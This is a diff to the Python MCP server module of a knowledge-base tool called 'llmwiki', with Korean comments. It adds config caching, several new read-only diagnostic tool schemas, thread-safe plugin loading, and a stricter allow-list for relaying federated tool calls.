@@ -25,6 +25,8 @@ import json
 import os
 import secrets
 import sys
+import threading
+import time
 import urllib.error
 import urllib.request
 from typing import Any, Dict, List, Optional, Tuple
@@ -32,7 +34,54 @@ from typing import Any, Dict, List, Optional, Tuple
 PROTOCOL_VERSION = "2025-06-18"
 # 클라이언트가 요청한 버전이 이 안에 있으면 그대로 돌려준다(협상). 없으면 우리 최신을 돌려주고 클라이언트가 판단한다.
 SUPPORTED_PROTOCOLS = ("2025-06-18", "2025-03-26", "2024-11-05")
-SERVER_INFO = {"name": "llmwiki", "version": "0.5.0"}
+from . import __version__ as _PKG_VERSION
+from .auth import AuthError            # overrides 화이트리스트 거부를 도구 오류로 돌려주기 위해
+SERVER_INFO = {"name": "llmwiki", "version": _PKG_VERSION}      # = docs/RELEASE_NOTES.md 최신 절 · `--version` · /api/status.version
+
+
+# ---------------------------------------------------------------- 설정 (server.json `mcp` 절, 기본값은 reqmgr.DEFAULTS["mcp"])
+_CFG_CACHE: Dict[str, Any] = {"ts": 0.0, "cfg": None}
+_CFG_TTL_S = 5.0
+
+
+def mcp_config(refresh: bool = False) -> Dict[str, Any]:
+    """server.json 의 `mcp` 절 (+ 코드 기본값 · 환경변수 LLMWIKI_SERVER_MCP_<KEY>). 요청마다 파일을 읽지 않도록 5초 캐시.
+
+    키: fed_cache_ttl_s · fed_list_timeout_s · source_timeout_s_default · ingest_timeout_s_default · bridge_timeout_s ·
+        max_k · max_doc_chars · plugin_rescan_s · instructions  (설명은 reqmgr.DEFAULTS 의 주석과 docs/MCP.md §9)
+    """
+    now = time.time()
+    if not refresh and _CFG_CACHE["cfg"] is not None and now - _CFG_CACHE["ts"] < _CFG_TTL_S:
+        return _CFG_CACHE["cfg"]
+    from . import reqmgr as _rq
+    cfg: Dict[str, Any] = {k: v for k, v in (_rq.DEFAULTS.get("mcp") or {}).items() if not str(k).startswith("_")}
+    try:
+        got = (_rq.load_config() or {}).get("mcp")
+        if isinstance(got, dict):
+            cfg.update({k: v for k, v in got.items() if not str(k).startswith("_")})
+    except Exception:
+        pass
+    _CFG_CACHE.update({"ts": now, "cfg": cfg})
+    return cfg
+
+
+def _cfg_num(key: str, fallback: float) -> float:
+    try:
+        v = mcp_config().get(key)
+        return float(v) if v is not None and v != "" else float(fallback)
+    except Exception:
+        return float(fallback)
+
+
+def _cap_int(args: Dict[str, Any], key: str, default: int, cap_key: str) -> int:
+    """정수 인자를 1 이상, server.json mcp.<cap_key> 이하로 자른다 (k=100000 같은 값이 파이프라인에 들어가지 않게)."""
+    try:
+        v = int(args.get(key) if args.get(key) not in (None, "") else default)
+    except Exception:
+        v = default
+    v = max(1, v)
+    cap = int(_cfg_num(cap_key, 0))
+    return min(v, cap) if cap > 0 else v
 
 # 도구 힌트 (MCP annotations) — 붙는 LLM 이 "이 도구가 무엇을 바꾸는가" 를 스스로 판단한다.
 #   readOnlyHint   : 색인·설정을 바꾸지 않음
@@ -42,6 +91,8 @@ SERVER_INFO = {"name": "llmwiki", "version": "0.5.0"}
 ANNOTATIONS: Dict[str, Dict[str, Any]] = {
     "wiki_query": {"title": "위키에 질문", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
     "wiki_search": {"title": "채널 검색 디버그", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
+    "wiki_inspect": {"title": "질의 해부 (LLM 없음)", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
+    "wiki_evolve": {"title": "자가진화 제안 보기", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
     "wiki_related": {"title": "유사 문서·연결", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
     "wiki_doc": {"title": "문서 전문", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
     "wiki_entity": {"title": "엔티티 상세", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
@@ -56,6 +107,12 @@ ANNOTATIONS: Dict[str, Dict[str, Any]] = {
     # 재실행은 색인·설정을 바꾸지 않는다(읽기). 다만 **LLM 을 다시 부르므로** 같은 인자로 다시 불러도
     # 답 글자가 달라질 수 있어 idempotent 는 아니다 — 붙는 LLM 이 "한 번 더 불러도 되는가" 를 그렇게 판단한다.
     "wiki_rerun": {"title": "지난 질의를 특정 단계부터 다시", "readOnlyHint": True, "idempotentHint": False, "openWorldHint": False},
+    # 스윕 = 재실행 N회. 같은 이유로 읽기이되 idempotent 는 아니다.
+    "wiki_sweep": {"title": "파라미터 스윕 (값별 단계 비교)", "readOnlyHint": True, "idempotentHint": False, "openWorldHint": False},
+    "wiki_rules": {"title": "질의 규칙 사전 설명·테스트", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
+    "wiki_graph_rules": {"title": "그래프 빌드 규칙 보기·점검·시험", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
+    # 프로파일은 읽기 전용이지만 실행마다 data/graph_profiles 에 이력 파일을 남긴다(색인·설정은 불변) — eval=true 면 LLM 을 부를 수 있어 idempotent 는 아니다
+    "wiki_graph_profile": {"title": "그래프 진단 프로파일", "readOnlyHint": True, "idempotentHint": False, "openWorldHint": False},
 }
 
 TOOLS: List[Dict[str, Any]] = [
@@ -64,12 +121,43 @@ TOOLS: List[Dict[str, Any]] = [
      "inputSchema": {"type": "object", "properties": {"question": {"type": "string"}, "k": {"type": "integer", "description": "근거 문단 수", "default": 8},
                                                       "mode": {"type": "string", "enum": ["fast", "normal", "deep"], "default": "normal"},
                                                       "doc_types": {"type": "array", "items": {"type": "string"}, "description": "우선할 문서 유형 (issue, cl, sw_design, hw_design, coding_rule, weekly_report, tc_list)"},
-                                                      "preset": {"type": "string", "description": "presets.json 이름 (quality|speed|token|deep_research…)"}},
+                                                      "preset": {"type": "string", "description": "presets.json 이름 (quality|speed|token|deep_research…)"},
+                                                      "output_mode": {"type": "string", "enum": ["answer", "fused", "reranked", "context"],
+                                                                      "description": "answer(기본)=답변까지 · fused=융합·부스트 뒤 후보(리랭크 전, structuredContent.candidates/lists/stages) · reranked=리랭크 뒤 후보 · context=컨텍스트([C#] 블록)까지만(structuredContent.context/refs, 답변 LLM 생략)"},
+                                                      "overrides": {"type": "object", "description": "이번 호출에만 적용할 평면 설정 (Web /api/query 의 overrides 와 같은 길). 예 {\"top_k_final\": 12, \"answer_mode\": \"best_effort\", \"tuning\": {\"fts_topk_n\": 5, \"fts_topk_w\": 1.5, \"channel_inject\": \"vector:2\"}} — tuning 안의 키는 tuning.json 키(요청 오버레이, 파일에 남지 않음)"}},
                      "required": ["question"]}},
-    {"name": "wiki_search", "description": "단일 채널 검색 디버그: fts | vector | graph.",
-     "inputSchema": {"type": "object", "properties": {"channel": {"type": "string", "enum": ["fts", "vector", "graph"]},
-                                                      "query": {"type": "string"}, "k": {"type": "integer", "default": 8}},
-                     "required": ["channel", "query"]}},
+    {"name": "wiki_search", "description": "채널 검색 디버그: fts | vector | graph 를 하나 또는 여러 개 조합해 돌린다. "
+                                           "channels 로 여러 채널을 주고 mode 로 조합 방식을 고른다 — or(합집합·커버리지) · and(교집합·채널 합의) · rrf(질의 경로와 같은 가중 융합). "
+                                           "결과의 각 행에는 어느 채널이 몇 위로 찾았는지가 함께 온다.",
+     "inputSchema": {"type": "object", "properties": {
+         "channel": {"type": "string", "enum": ["fts", "vector", "graph"], "description": "채널 하나 (channels 를 쓰면 무시)"},
+         "channels": {"type": "array", "items": {"type": "string", "enum": ["fts", "vector", "graph"]},
+                      "description": "여러 채널 (예: [\"fts\",\"vector\"]). \"all\" 한 개로 전부."},
+         "mode": {"type": "string", "enum": ["or", "and", "rrf"], "default": "or"},
+         "require": {"type": "array", "items": {"type": "string", "enum": ["fts", "vector", "graph"]},
+                     "description": "이 채널들이 **반드시** 찾아야 한다 (AND). channels 와 섞으면 (channels 중 하나) 그리고 (require 전부)."},
+         "exclude": {"type": "array", "items": {"type": "string", "enum": ["fts", "vector", "graph"]},
+                     "description": "이 채널들이 찾은 것은 결과에서 **뺀다** (NOT)."},
+         "doc_types": {"type": "array", "items": {"type": "string"},
+                       "description": "이 문서 유형만 (예 [\"issue\",\"cl\"]). wiki_query 의 doc_types 가 *가중치* 인 것과 달리 여기서는 **거르는** 조건이다. 유형 목록은 wiki_status."},
+         "query": {"type": "string"}, "k": {"type": "integer", "default": 8}},
+                     "required": ["query"]}},
+    {"name": "wiki_evolve", "description": "자가진화 제안 **보기** (읽기 전용): 대기 중 제안 · 최근 적용 이력 · 자동 적용 설정 · 제안 종류 목록. "
+                                           "기본으로 제안마다 사람이 읽을 수 있는 설명(explain: 무엇이 · 어느 파일에서 · 어떻게 바뀌고 · "
+                                           "리빌드가 드는지 · 값이 성한지)이 붙는다 — Web Evolve 탭 · CLI `evolve show` 와 같은 내용이다. "
+                                           "붙어 있는 LLM 이 wiki_propose 로 올린 제안이 어떻게 됐는지 확인할 수 있다. "
+                                           "적용·거절은 사람이 한다 (Web Evolve 탭 또는 CLI `evolve apply|reject`).",
+     "inputSchema": {"type": "object", "properties": {
+         "status": {"type": "string", "enum": ["proposed", "applied", "rejected", "archived", "failed", "rejected_regression"],
+                    "description": "이 상태의 제안만 (기본 proposed)"},
+         "id": {"type": "integer", "description": "이 번호의 제안 하나만 — 설명 전문을 준다 (CLI `evolve show <id>` 와 같다)"},
+         "explain": {"type": "boolean", "default": True,
+                     "description": "제안마다 설명을 붙일지 (false 면 payload 원문만 — 토큰을 아낄 때)"},
+         "limit": {"type": "integer", "default": 30}}}},
+    {"name": "wiki_inspect", "description": "질의 해부 (LLM 없이, 수 ms): 이 질문이 검색에 들어가기 전에 무엇으로 변하는가 — "
+                                            "토큰화·키워드·불용어, 규칙 확장(동의어·약어·별칭·제외), 시간 표현 범위, 채널 라우팅 가중치, 고정 근거(pin). "
+                                            "답이 이상할 때 '질문이 제대로 이해됐는지' 를 먼저 확인하는 도구.",
+     "inputSchema": {"type": "object", "properties": {"query": {"type": "string"}}, "required": ["query"]}},
     {"name": "wiki_related", "description": "입력 텍스트(예: 이슈 분석 결과)와 유사한 문서 + 그래프로 연결된 CL/Issue/TC 를 함께 반환 (이슈 분석 use case).",
      "inputSchema": {"type": "object", "properties": {"text": {"type": "string"}, "doc_types": {"type": "array", "items": {"type": "string"}, "default": ["issue", "cl"]},
                                                       "k": {"type": "integer", "default": 8}}, "required": ["text"]}},
@@ -91,7 +179,18 @@ TOOLS: List[Dict[str, Any]] = [
                                                       "expected_terms": {"type": "array", "items": {"type": "string"}}, "expected_chunks": {"type": "array", "items": {"type": "string"}},
                                                       "note": {"type": "string"}, "propose": {"type": "boolean", "default": False, "description": "수정안을 HITL 제안 큐에 등록"}},
                      "required": []}},
-    {"name": "wiki_status", "description": "색인 통계와 프로바이더 상태.", "inputSchema": {"type": "object", "properties": {}}},
+    {"name": "wiki_status", "description": "색인 통계와 프로바이더 상태. `full=true` 를 주면 **운영 통계**를 함께 — "
+                                           "빌드(어느 단계가 느린가) · 질의량(언제 몰리나) · 지연 p50/p95 와 느린 질의 · "
+                                           "토큰(질의당·가장 무거운 질의) · 품질 신호(근거 부족·피드백·포렌식) · 사용자별 · "
+                                           "디스크(테이블·폴더별) · 임베딩 캐시 적중. CLI `stats --full` · Web 옵저빌리티 › 시스템 과 같은 값.",
+     "inputSchema": {"type": "object", "properties": {
+         "full": {"type": "boolean", "default": False, "description": "운영 통계 포함"},
+         "days": {"type": "number", "default": 7, "description": "full: 집계 기간 (일)"},
+         "sections": {"type": "array", "items": {"type": "string"},
+                      "description": "full: 이 섹션만 — index|build|queries|latency|tokens|quality|users|storage|embed|trend"},
+         "bucket": {"type": "string", "enum": ["day", "week", "month"], "default": "day",
+                    "description": "full + sections=trend: 추세를 일/주/월 중 무엇으로 묶을지. 기간은 묶음에 맞춰 자동(주간 12주·월간 1년)"},
+         "top": {"type": "integer", "default": 8}}}},
     {"name": "wiki_analysis", "description": "상세 분석 리포트: 질의 한 건(request_id, 생략=마지막)의 모든 단계 결과·설정 스냅샷·품질/속도/토큰 렌즈 소견과 조절점(토글/튜닝 키)을 마크다운으로 돌려준다. "
                                              "튜닝 제안을 만들 때 이 리포트를 근거로 삼는다. analysis_mode 토글이 켜진 질의는 debug·프롬프트 샘플까지 포함.",
      "inputSchema": {"type": "object", "properties": {"request_id": {"type": "integer"}, "focus": {"type": "string", "enum": ["quality", "speed", "tokens", "all"], "default": "all"}}}},
@@ -118,24 +217,65 @@ TOOLS: List[Dict[str, Any]] = [
          "request_id": {"type": "integer", "description": "다시 돌릴 원 요청 id (wiki_query/wiki_requests 결과에 있다)"},
          "from": {"type": "string", "description": "재시작점. 생략하면 answer_llm. 목록은 request_id 없이 호출"},
          "overrides": {"type": "object", "description": "이번 실행에만 적용할 평면 설정 (예 {\"claim_check\": false, \"top_k_final\": 12})"}}}},
+    {"name": "wiki_sweep", "description": "파라미터 **스윕** (docs/SWEEP.md): 지난 질의(request_id, \"last\" 가능)를 기준으로 키 하나(rrf_k · rerank 토글 · "
+                                          "top_k_final · answer_model …)의 값을 바꿔 가며 값마다 **그 키의 단계부터** 재생 재실행하고, 값별 단계 시간·순위·"
+                                          "컨텍스트·답변·groundedness 를 기준(첫 값) 과 비교해 돌려준다. 앞 단계는 재생하므로 차이는 그 값의 효과다. "
+                                          "key 없이 부르면 스윕할 수 있는 키 목록(type/min/max/choices/point). 값 개수는 config sweep_max_values 로 제한.",
+     "inputSchema": {"type": "object", "properties": {
+         "request_id": {"type": ["integer", "string"], "description": "기준 요청 id 또는 \"last\" (생략 = last)"},
+         "key": {"type": "string", "description": "바꿀 키 (튜닝 키 · 토글 · config 키 · <role>_model|provider|effort)"},
+         "values": {"type": "array", "description": "값 목록 (예 [10, 60]). 토글이면 생략 시 [false, true]"},
+         "range": {"type": "string", "description": "start:stop:step (예 \"10:100:10\"). values 대신"},
+         "repeats": {"type": "integer", "default": 1, "description": "값마다 반복 횟수 (LLM 흔들림 확인용)"},
+         "from": {"type": "string", "description": "재시작점 강제 (기본: 키가 속한 단계에서 자동)"}}}},
+    {"name": "wiki_rules", "description": "규칙 기반 질의 확장 사전(query_rules.json)을 읽기 전용으로 본다. "
+                                          "action=types 는 **규칙 유형 표**(각 유형이 어느 방향으로 어떻게 넓히는지 — 새 규칙을 제안할 때 근거), "
+                                          "action=explain 은 용어(term) 하나가 어느 유형·어느 방향으로 무엇을 끌어오는지, "
+                                          "action=test 는 질의(q) 전체의 확장 결과(fts_query·alt_queries·related·exclude·seeds·fired)를 돌려준다. 사전을 바꾸지 않는다 "
+                                          "(추가는 wiki_propose 로 제안하면 사람이 승인한다).",
+     "inputSchema": {"type": "object", "properties": {"action": {"type": "string", "enum": ["explain", "test", "types"], "default": "explain"},
+                                                      "term": {"type": "string", "description": "explain 대상 용어"},
+                                                      "q": {"type": "string", "description": "test 대상 질의"}}}},
+    {"name": "wiki_graph_profile", "description": "지식 그래프 진단 프로파일(docs/history/2026-09-18/IMPLEMENTATION_PLAN_0918_2.md §2.5): 규모·연결성(성분/고립/허브)·문서 커버리지·품질 신호(중복 후보/끊긴 관계/cooccur 비중)·"
+                                                  "규칙 기여(죽은 규칙)·질의 활용·개선 제안(어느 파일·키를 고칠지). compare=true 면 직전 실행과 핵심 지표 차이, eval=true 면 그래프 채널만 켠 hit@k 를 함께. "
+                                                  "색인·설정은 바꾸지 않지만 실행 이력을 data/graph_profiles 에 남긴다.",
+     "inputSchema": {"type": "object", "properties": {"eval": {"type": "boolean", "default": False}, "compare": {"type": "boolean", "default": False}}}},
+    {"name": "wiki_graph_rules", "description": "**그래프 빌드** 규칙(data/rules.json)을 읽기 전용으로 본다 — 질의 확장 규칙을 보는 wiki_rules 와 짝이다. "
+                                                "action=types 는 엔티티 type 목록·값 종류(relation_patterns[*].value 에 쓸 수 있는 것)·관계 어휘(schema.relations, inverse 포함), "
+                                                "action=lint 는 빌드 전 정적 점검(깨진 정규식·없는 type·가려진 link_rules·겹치는 별칭·inverse 짝), "
+                                                "action=test 는 문장 하나(q)를 실제로 추출해 어떤 노드와 관계가 생기는지. 규칙을 바꾸지 않는다 "
+                                                "(추가는 wiki_propose 의 entity/alias 제안으로 올리면 사람이 승인한다).",
+     "inputSchema": {"type": "object", "properties": {
+         "action": {"type": "string", "enum": ["types", "lint", "test"], "default": "types"},
+         "q": {"type": "string", "description": "test 대상 문장"},
+         "doc_type": {"type": "string", "description": "test: 문서 유형 (link_rules 확인용 — 예 cl)"},
+         "ext_id": {"type": "string", "description": "test: 문서 ID (예 CL-55302)"}}}},
 ]
 
 # ---------------------------------------------------------------- 확장: 플러그인 도구 레지스트리 · 페더레이션
 _PLUGIN_TOOLS: Dict[str, Tuple[Dict[str, Any], Any]] = {}     # name → (spec, handler(pipe, args) -> result dict | str)
-_PLUGIN_STATE: Dict[str, Any] = {"dir": None, "sig": None, "errors": [], "files": []}
-_FED_CACHE: Dict[str, Any] = {}                                # source → {"ts", "tools"}
+_PLUGIN_STATE: Dict[str, Any] = {"dir": None, "sig": None, "errors": [], "files": [], "checked": 0.0}
+_PLUGIN_LOCK = threading.RLock()     # reload 중에 다른 스레드가 _PLUGIN_TOOLS 를 순회하면 "dictionary changed size" — 적재·조회 모두 이 락 안에서
+_FED_CACHE: Dict[str, Any] = {}                                # source → {"ts", "tools", "error"} · "_list" → {"error", "duplicates"}
+_FED_LOCK = threading.Lock()
 FED_SEP = "__"
 
 
 def register_tool(spec: Dict[str, Any], handler) -> None:
-    """플러그인이 부르는 등록 함수. spec = {"name","description","inputSchema"}; handler(pipe, args) → MCP result dict 또는 str."""
+    """플러그인이 부르는 등록 함수. spec = {"name","description","inputSchema"[, "title", "annotations"]}; handler(pipe, args) → MCP result dict 또는 str.
+    annotations(readOnlyHint 등)·title 을 적으면 tools/list 에 그대로 실린다 — 붙는 LLM 이 그 도구가 무엇을 바꾸는지 판단하는 근거."""
     name = str(spec.get("name") or "").strip()
     if not name or FED_SEP in name:
         raise ValueError("tool name required (must not contain '%s'): %r" % (FED_SEP, name))
     if any(t["name"] == name for t in TOOLS):
         raise ValueError("built-in tool name: %s" % name)
-    sp = {"name": name, "description": str(spec.get("description") or ""), "inputSchema": spec.get("inputSchema") or {"type": "object", "properties": {}}}
-    _PLUGIN_TOOLS[name] = (sp, handler)
+    sp: Dict[str, Any] = {"name": name, "description": str(spec.get("description") or ""), "inputSchema": spec.get("inputSchema") or {"type": "object", "properties": {}}}
+    if spec.get("title"):
+        sp["title"] = str(spec["title"])
+    if isinstance(spec.get("annotations"), dict):
+        sp["annotations"] = dict(spec["annotations"])
+    with _PLUGIN_LOCK:
+        _PLUGIN_TOOLS[name] = (sp, handler)
 
 
 def plugins_dir(settings=None) -> str:
@@ -144,30 +284,54 @@ def plugins_dir(settings=None) -> str:
     return resolve_path(d) if not os.path.isabs(d) else d
 
 
+def _plugin_snapshot(d: str, files: List[str]) -> Dict[str, Any]:
+    return {"dir": d, "tools": list(_PLUGIN_TOOLS), "errors": list(_PLUGIN_STATE["errors"]), "files": list(files)}
+
+
 def load_plugins(settings=None, force: bool = False) -> Dict[str, Any]:
-    """<mcp_plugins_dir>/*.py (밑줄로 시작하지 않는 파일) 를 import 해 register(register_tool) 를 부른다. 파일 mtime 이 바뀌면 다시 읽는다."""
+    """<mcp_plugins_dir>/*.py (밑줄로 시작하지 않는 파일) 를 import 해 register(register_tool) 를 부른다.
+
+    파일 mtime 이 바뀌면 다시 읽되, 폴더 검사는 `plugin_rescan_s`(server.json mcp, 기본 5초)마다 한 번만 한다 —
+    예전에는 tools/list·tools/call **마다** listdir+getmtime 을 돌았다. 적재는 락 안에서 이루어진다.
+    """
     import importlib.util
     d = plugins_dir(settings)
-    files = sorted(f for f in (os.listdir(d) if os.path.isdir(d) else []) if f.endswith(".py") and not f.startswith("_"))
-    sig = tuple((f, os.path.getmtime(os.path.join(d, f))) for f in files)
-    if not force and _PLUGIN_STATE["dir"] == d and _PLUGIN_STATE["sig"] == sig:
-        return {"dir": d, "tools": list(_PLUGIN_TOOLS), "errors": _PLUGIN_STATE["errors"], "files": files}
-    _PLUGIN_TOOLS.clear()
-    errors: List[Dict[str, str]] = []
-    for f in files:
-        path = os.path.join(d, f)
-        try:
-            spec = importlib.util.spec_from_file_location("llmwiki_mcp_plugin_" + os.path.splitext(f)[0], path)
-            mod = importlib.util.module_from_spec(spec)   # type: ignore
-            spec.loader.exec_module(mod)                   # type: ignore
-            reg = getattr(mod, "register", None)
-            if not callable(reg):
-                raise RuntimeError("register(add_tool) 함수 없음")
-            reg(register_tool)
-        except Exception as e:
-            errors.append({"file": f, "error": "%s: %s" % (type(e).__name__, str(e)[:200])})
-    _PLUGIN_STATE.update({"dir": d, "sig": sig, "errors": errors, "files": files})
-    return {"dir": d, "tools": list(_PLUGIN_TOOLS), "errors": errors, "files": files}
+    now = time.time()
+    with _PLUGIN_LOCK:
+        rescan = _cfg_num("plugin_rescan_s", 5)
+        if not force and _PLUGIN_STATE["dir"] == d and now - float(_PLUGIN_STATE.get("checked") or 0) < rescan:
+            return _plugin_snapshot(d, _PLUGIN_STATE["files"])
+        files = sorted(f for f in (os.listdir(d) if os.path.isdir(d) else []) if f.endswith(".py") and not f.startswith("_"))
+        sig = tuple((f, os.path.getmtime(os.path.join(d, f))) for f in files)
+        _PLUGIN_STATE["checked"] = now
+        if not force and _PLUGIN_STATE["dir"] == d and _PLUGIN_STATE["sig"] == sig:
+            return _plugin_snapshot(d, files)
+        _PLUGIN_TOOLS.clear()
+        errors: List[Dict[str, str]] = []
+        for f in files:
+            path = os.path.join(d, f)
+            try:
+                spec = importlib.util.spec_from_file_location("llmwiki_mcp_plugin_" + os.path.splitext(f)[0], path)
+                mod = importlib.util.module_from_spec(spec)   # type: ignore
+                spec.loader.exec_module(mod)                   # type: ignore
+                reg = getattr(mod, "register", None)
+                if not callable(reg):
+                    raise RuntimeError("register(add_tool) 함수 없음")
+                reg(register_tool)
+            except Exception as e:
+                errors.append({"file": f, "error": "%s: %s" % (type(e).__name__, str(e)[:200])})
+        _PLUGIN_STATE.update({"dir": d, "sig": sig, "errors": errors, "files": files})
+        return _plugin_snapshot(d, files)
+
+
+def _plugin_tool(name: str) -> Optional[Tuple[Dict[str, Any], Any]]:
+    with _PLUGIN_LOCK:
+        return _PLUGIN_TOOLS.get(name)
+
+
+def _plugin_specs() -> List[Dict[str, Any]]:
+    with _PLUGIN_LOCK:
+        return [sp for sp, _ in _PLUGIN_TOOLS.values()]
 
 
 def _exposed_sources(settings) -> Dict[str, Dict[str, Any]]:
@@ -177,28 +341,61 @@ def _exposed_sources(settings) -> Dict[str, Dict[str, Any]]:
     return {n: c for n, c in _mc.enabled_sources(settings, ignore_toggle=True).items() if c.get("expose")}
 
 
-def federated_tools(settings, refresh: bool = False, ttl_s: int = 300) -> List[Dict[str, Any]]:
-    """expose 된 소스의 tool 을 `<source>__<tool>` 로. 소스별 tools/list 는 ttl 동안 캐시; 연결 실패는 빈 목록 + _FED_CACHE[...]["error"]."""
-    import time as _t
+def federated_tools(settings, refresh: bool = False, ttl_s: Optional[int] = None) -> List[Dict[str, Any]]:
+    """expose 된 소스의 tool 을 `<source>__<tool>` 로.
+
+    소스별 tools/list 는 `fed_cache_ttl_s`(기본 300초) 동안 캐시하고, 연결 실패도 같은 시간 동안 기억한다(백오프 —
+    죽은 소스 때문에 tools/list 마다 연결을 기다리지 않는다). 캐시가 없을 때의 원격 tools/list 는 `fed_list_timeout_s`(기본 5초)
+    안에 끝나야 한다(refresh=True 인 doctor/wiki_sources check 는 소스 자체 timeout_s 를 쓴다). 원격 spec 의 title/annotations 는 그대로 싣는다.
+    """
     from . import mcp_client as _mc
+    ttl = float(ttl_s if ttl_s is not None else _cfg_num("fed_cache_ttl_s", 300))
+    list_to = _cfg_num("fed_list_timeout_s", 5)
     out: List[Dict[str, Any]] = []
     for name, cfg in _exposed_sources(settings).items():
-        ent = _FED_CACHE.get(name)
-        if refresh or not ent or _t.time() - ent["ts"] > ttl_s:
+        with _FED_LOCK:
+            ent = _FED_CACHE.get(name)
+        if refresh or not ent or time.time() - ent["ts"] > ttl:
+            scfg = cfg if refresh else dict(cfg, timeout_s=list_to)
             try:
-                tools = _mc.remote_tools(name, cfg)
-                ent = {"ts": _t.time(), "tools": tools, "error": ""}
+                tools = _mc.remote_tools(name, scfg)
+                ent = {"ts": time.time(), "tools": tools, "error": ""}
             except Exception as e:
-                ent = {"ts": _t.time(), "tools": [], "error": str(e)[:200]}
-            _FED_CACHE[name] = ent
+                ent = {"ts": time.time(), "tools": [], "error": str(e)[:200], "retry_after_s": int(ttl)}
+            with _FED_LOCK:
+                _FED_CACHE[name] = ent
         allow = cfg.get("expose")
         for t in ent["tools"]:
             tn = str(t.get("name") or "")
             if not tn or (isinstance(allow, list) and tn not in allow):
                 continue
-            out.append({"name": name + FED_SEP + tn, "description": "[%s] %s" % (name, t.get("description") or ""),
-                        "inputSchema": t.get("inputSchema") or {"type": "object", "properties": {}}, "_source": name})
+            spec: Dict[str, Any] = {"name": name + FED_SEP + tn, "description": "[%s] %s" % (name, t.get("description") or ""),
+                                    "inputSchema": t.get("inputSchema") or {"type": "object", "properties": {}}, "_source": name}
+            if t.get("title"):
+                spec["title"] = "[%s] %s" % (name, t["title"])
+            if isinstance(t.get("annotations"), dict):
+                spec["annotations"] = dict(t["annotations"])
+            out.append(spec)
     return out
+
+
+def _known_remote_tools(settings, src: str, cfg: Dict[str, Any]) -> List[str]:
+    """expose:true 일 때 통과시킬 도구 이름 — REST 는 cfg.tools 선언, MCP 는 캐시된 tools/list (없으면 지금 받아 온다)."""
+    if str(cfg.get("transport") or "stdio").lower() == "rest":
+        return [str(t.get("name") or "") for t in (cfg.get("tools") or []) if isinstance(t, dict)]
+    with _FED_LOCK:
+        ent = _FED_CACHE.get(src)
+    if not ent:
+        federated_tools(settings)
+        with _FED_LOCK:
+            ent = _FED_CACHE.get(src) or {}
+    return [str(t.get("name") or "") for t in (ent.get("tools") or [])]
+
+
+def duplicate_tools() -> List[str]:
+    """마지막 tools/list 에서 이름이 겹쳐 **버려진** 도구 이름 (wiki_sources · doctor 가 보여 준다)."""
+    with _FED_LOCK:
+        return list((_FED_CACHE.get("_list") or {}).get("duplicates") or [])
 
 
 FED_HEADER = "X-LLMWiki-Federation-Depth"     # 페더레이션 호출임을 원격에 알린다 → 원격은 자기 페더레이션을 하지 않는다 (A↔B 상호 expose 시 무한 재귀 방지)
@@ -229,22 +426,31 @@ def list_tools(pipe, federate: bool = True) -> List[Dict[str, Any]]:
     """tools/list = built-in + 플러그인 + (federate 이면) 페더레이션."""
     s = getattr(pipe, "s", None)
     load_plugins(s)
-    tools = [_annotated(t) for t in TOOLS] + [sp for sp, _ in _PLUGIN_TOOLS.values()]
+    tools = [_annotated(t) for t in TOOLS] + _plugin_specs()
+    fed_error = ""
     if federate and federation_allowed():
         try:
             tools += [{k: v for k, v in t.items() if not k.startswith("_")} for t in federated_tools(s)]
         except Exception as e:      # 페더레이션이 죽어도 우리 도구는 계속 보여야 한다 (원인은 wiki_sources 로 확인)
-            _FED_CACHE.setdefault("_list", {})["error"] = str(e)[:200]
-    # 이름 중복은 클라이언트가 어느 것을 부를지 알 수 없다 — 뒤에 온 것을 버리고 알린다
+            fed_error = str(e)[:200]
+    # 이름 중복은 클라이언트가 어느 것을 부를지 알 수 없다 — 뒤에 온 것을 버리고 알린다 (wiki_sources.duplicate_tools · doctor "중복 도구 이름")
     seen: Dict[str, int] = {}
     out = []
+    dups: List[str] = []
     for t in tools:
         n = str(t.get("name") or "")
         if not n or n in seen:
-            _FED_CACHE.setdefault("_list", {})["duplicate"] = n
+            dups.append(n)
             continue
         seen[n] = 1
         out.append(t)
+    with _FED_LOCK:
+        st = _FED_CACHE.setdefault("_list", {})
+        st["duplicates"] = dups
+        if fed_error:
+            st["error"] = fed_error
+        else:
+            st.pop("error", None)
     return out
 
 
@@ -295,11 +501,13 @@ def call_extension(pipe, name: str, args: Dict[str, Any], federate: bool = True)
     """플러그인/페더레이션 도구면 처리해서 result 를, 아니면 None."""
     s = getattr(pipe, "s", None)
     load_plugins(s)
-    if name in _PLUGIN_TOOLS:
-        bad = validate_args(_PLUGIN_TOOLS[name][0], dict(args or {}))
+    ent = _plugin_tool(name)
+    if ent is not None:
+        spec, handler = ent
+        bad = validate_args(spec, dict(args or {}))
         if bad:
             return _err("invalid arguments for %s: %s" % (name, bad))
-        r = _PLUGIN_TOOLS[name][1](pipe, dict(args or {}))
+        r = handler(pipe, dict(args or {}))
         return _text(str(r)) if not isinstance(r, dict) else (r if "content" in r else _proxy_result(r))
     if FED_SEP in name:
         if not federate or not federation_allowed():
@@ -309,8 +517,12 @@ def call_extension(pipe, name: str, args: Dict[str, Any], federate: bool = True)
         if not cfg:
             return {"content": [{"type": "text", "text": "unknown federated source %s (expose/mcp_federation 확인)" % src}], "isError": True}
         allow = cfg.get("expose")
-        if isinstance(allow, list) and tool not in allow:
-            return {"content": [{"type": "text", "text": "tool %s is not exposed by source %s" % (tool, src)}], "isError": True}
+        if isinstance(allow, list):
+            if tool not in allow:
+                return {"content": [{"type": "text", "text": "tool %s is not exposed by source %s" % (tool, src)}], "isError": True}
+        elif tool not in _known_remote_tools(s, src, cfg):
+            # expose:true 도 "그 서버가 tools/list 로 알린 도구" 만 통과한다 — 임의 이름(REST 라면 임의 경로)을 중계하지 않는다
+            return {"content": [{"type": "text", "text": "tool %s is not in the tool list of source %s (expose:true 는 tools/list·tools 선언에 있는 도구만 중계)" % (tool, src)}], "isError": True}
         from . import mcp_client as _mc
         try:
             return _proxy_result(_mc.call_source_tool(src, cfg, tool, dict(args or {})))
@@ -319,11 +531,37 @@ def call_extension(pipe, name: str, args: Dict[str, Any], federate: bool = True)
     return None
 
